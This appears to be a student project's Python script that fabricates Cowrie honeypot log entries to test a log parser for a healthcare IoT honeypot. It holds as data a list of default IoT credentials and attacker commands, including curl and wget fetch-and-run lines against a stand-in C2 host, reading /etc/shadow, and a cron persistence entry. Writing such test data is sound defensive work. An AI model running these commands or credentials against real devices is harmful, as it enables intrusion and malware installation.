"""
IoT Honeypot - Attack Simulator
Generates realistic Cowrie JSON log entries for testing
Use this if no real attackers have connected yet.
Project 2: Healthcare - IoT Deception Honeypot Network
Infotact Technical Internship Program
"""

import json
import os
import random
from datetime import datetime, timedelta


# Realistic attacker IPs from known threat intel
ATTACKER_IPS = [
    "185.220.101.45",
    "45.33.32.156",
    "103.21.244.0",
    "194.165.16.29",
    "89.248.167.131",
    "198.199.10.234",
    "91.92.109.47",
]

# Common IoT default credentials attackers try
CREDENTIALS = [
    ("root",  "admin"),
    ("root",  "123456"),
    ("root",  "password"),
    ("root",  "root"),
    ("root",  "toor"),
    ("admin", "admin"),
    ("admin", "password"),
    ("pi",    "raspberry"),
    ("pi",    "pi"),
    ("user",  "user"),
    ("root",  "12345"),
    ("root",  ""),
]

# Common attacker commands after getting in
COMMANDS = [
    "uname -a",
    "cat /etc/passwd",
    "cat /etc/shadow",
    "id",
    "whoami",
    "ls /",
    "ls /opt",
    "cat /opt/vitals-monitor/config.ini",
    "cat /opt/vitals-monitor/export.sh",
    "ps aux",
    "netstat -an",
    "ifconfig",
    "wget http://malicious-c2.example.com/payload.sh -O /tmp/payload.sh",
    "chmod +x /tmp/payload.sh",
    "curl http://malicious-c2.example.com/bot.sh | bash",
    "crontab -e",
    "echo '* * * * * /tmp/payload.sh' >> /var/spool/cron/root",
]


def generate_session_id():
    return "".join(random.choices("abcdef0123456789", k=8))


def generate_logs(output="cowrie-logs/cowrie.json", num_sessions=15):
    """Generate realistic Cowrie log entries."""
    os.makedirs("cowrie-logs", exist_ok=True)

    events = []
    base_time = datetime.utcnow() - timedelta(hours=48)

    print(f"[*] Generating {num_sessions} simulated attack sessions...")

    for i in range(num_sessions):
        ip = random.choice(ATTACKER_IPS)
        session = generate_session_id()
        t = base_time + timedelta(minutes=random.randint(0, 2880))

        # Session connect event
        events.append({
            "eventid": "cowrie.session.connect",
            "src_ip": ip,
            "session": session,
            "timestamp": t.isoformat() + "Z",
            "protocol": random.choice(["ssh", "telnet"])
        })

        # Multiple login attempts (brute force)
        num_attempts = random.randint(3, 20)
        for attempt in range(num_attempts):
            t += timedelta(seconds=random.randint(1, 5))
            user, pwd = random.choice(CREDENTIALS)
            # Last attempt succeeds for some sessions
            success = (attempt == num_attempts - 1) and random.random() < 0.4

            events.append({
                "eventid": "cowrie.login.success" if success else "cowrie.login.failed",
                "src_ip": ip,
                "session": session,
                "username": user,
                "password": pwd,
                "timestamp": t.isoformat() + "Z"
            })

            if success:
                # After login, run commands
                num_cmds = random.randint(2, 8)
                for _ in range(num_cmds):
                    t += timedelta(seconds=random.randint(2, 15))
                    cmd = random.choice(COMMANDS)
                    events.append({
                        "eventid": "cowrie.command.input",
                        "src_ip": ip,
                        "session": session,
                        "input": cmd,
                        "timestamp": t.isoformat() + "Z"
                    })

                # Some sessions drop a file (malware)
                if random.random() < 0.3:
                    t += timedelta(seconds=5)
                    events.append({
                        "eventid": "cowrie.session.file_download",
                        "src_ip": ip,
                        "session": session,
                        "url": f"http://malicious-c2.example.com/payload_{random.randint(1,9)}.sh",
                        "filename": f"/tmp/payload_{random.randint(1,9)}.sh",
                        "shasum": "".join(random.choices("abcdef0123456789", k=64)),
                        "size": random.randint(512, 8192),
                        "timestamp": t.isoformat() + "Z"
                    })
                break

        # Session disconnect
        t += timedelta(seconds=random.randint(5, 60))
        events.append({
            "eventid": "cowrie.session.closed",
            "src_ip": ip,
            "session": session,
            "timestamp": t.isoformat() + "Z"
        })

    # Write all events to log file
    with open(output, "w") as f:
        for event in sorted(events, key=lambda x: x["timestamp"]):
            f.write(json.dumps(event) + "\n")

    print(f"[*] Generated {len(events)} log events")
    print(f"[*] Saved to: {output}")
    print(f"\n[*] Now run:  python3 scripts/parse_logs.py")


if __name__ == "__main__":
    generate_logs()
